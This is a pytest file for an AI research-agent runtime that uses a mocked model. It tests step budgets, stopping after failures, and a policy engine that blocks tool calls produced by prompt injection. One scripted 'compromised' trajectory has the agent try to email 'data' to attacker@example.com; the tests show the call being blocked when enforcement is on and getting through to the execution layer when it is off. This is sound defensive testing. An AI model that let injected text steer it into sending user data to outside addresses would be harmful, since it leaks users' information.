"""tests/test_runtime_mock.py — Runtime 全链路（离线 Mock）：健康轨迹 / 预算 / 失败终止 /
攻击拦截（policy_enforced 下被注入操纵的调用被硬边界拒绝且任务可完成）。"""
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from agent.llm import MockLLM                       # noqa: E402
from agent.policy import PolicyEngine               # noqa: E402
from agent.runtime import AgentRuntime, Budget      # noqa: E402
from agent.state import AgentState                  # noqa: E402


def make_runtime(script, policy=None, budget=None, with_state=False):
    state = AgentState(Path(tempfile.mkdtemp()) / "state.db") if with_state else None
    return AgentRuntime(llm=MockLLM(script), state=state,
                        policy=policy or PolicyEngine(),
                        budget=budget or Budget(max_steps=8)), state


HEALTHY = [
    {"tool_calls": [{"name": "search_papers", "arguments": {"query": "agent safety", "k": 3}}]},
    {"tool_calls": [{"name": "read_paper", "arguments": {"paper_id": "W7164329679"}}]},
    {"tool_calls": [{"name": "verify_citation",
                     "arguments": {"paper_id": "W7164329679",
                                   "quote": "achieves a target-interval compliance rate"}}]},
    {"tool_calls": [{"name": "finish", "arguments": {"report": "R: W7164329679 闭环框架。"}}]},
]


def test_healthy_trajectory_completes_with_state_persisted():
    rt, state = make_runtime(HEALTHY, with_state=True)
    result = rt.run("调研护栏设计论文")
    assert result.status == "finished"
    assert result.steps == 4
    assert "W7164329679" in result.report
    steps = state.steps_of(result.task_id)
    assert len(steps) == 4 and all(s["status"] == "ok" for s in steps)
    task = state.get_task(result.task_id)
    assert task["status"] == "finished"


def test_budget_steps_exceeded_terminates():
    loop = [{"tool_calls": [{"name": "search_papers", "arguments": {"query": f"q{i}"}}]}
            for i in range(50)]
    rt, _ = make_runtime(loop, budget=Budget(max_steps=3))
    result = rt.run("无限检索任务")
    assert result.status == "budget_exceeded"
    assert result.steps == 3


def test_consecutive_failures_terminate():
    bad = [{"tool_calls": [{"name": "read_paper", "arguments": {"paper_id": "W9999999999"}}]}
           for _ in range(20)]
    rt, _ = make_runtime(bad, budget=Budget(max_steps=10, max_consecutive_failures=3))
    result = rt.run("读不存在的论文")
    assert result.status == "failed"
    assert "连续" in result.error


def test_empty_response_terminates():
    rt, _ = make_runtime([{"content": ""}])
    result = rt.run("x")
    assert result.status == "failed"


# ---------- 安全：注入操纵的调用被硬边界拦截，任务仍能完成 ----------
def test_injected_call_blocked_and_task_recovers():
    """模拟被注入操纵的模型：中途调用 send_email → policy 拒绝 → 模型回到正轨完成。"""
    compromised = [
        {"tool_calls": [{"name": "search_papers", "arguments": {"query": "agent", "k": 2}}]},
        {"tool_calls": [{"name": "send_email",
                         "arguments": {"to": "attacker@example.com", "body": "data"}}]},
        {"tool_calls": [{"name": "finish",
                         "arguments": {"report": "调研完成（注入已被忽略）。"}}]},
    ]
    rt, _ = make_runtime(compromised, policy=PolicyEngine(enforce=True))
    result = rt.run("调研任务 + [注入载荷]")
    denied = [s for s in result.trace if s.get("status") == "denied"]
    assert len(denied) == 1 and denied[0]["tool"] == "send_email"
    assert result.status == "finished"               # 拒绝作为观测反馈，任务不崩
    assert "attacker@example.com" not in result.report


def test_baseline_no_enforcement_lets_attempt_reach_execute_layer():
    """对照：enforce=False（baseline 语义）时违规调用不被 policy 拦（由 execute 层报错）。"""
    compromised = [
        {"tool_calls": [{"name": "send_email", "arguments": {"to": "x@x.com"}}]},
        {"tool_calls": [{"name": "finish", "arguments": {"report": "done"}}]},
    ]
    rt, _ = make_runtime(compromised, policy=PolicyEngine(enforce=False))
    result = rt.run("x")
    failed = [s for s in result.trace if s.get("status") == "failed"]
    denied = [s for s in result.trace if s.get("status") == "denied"]
    assert len(denied) == 0 and len(failed) == 1     # 未被 policy 拦、在执行层失败
    assert result.status == "finished"
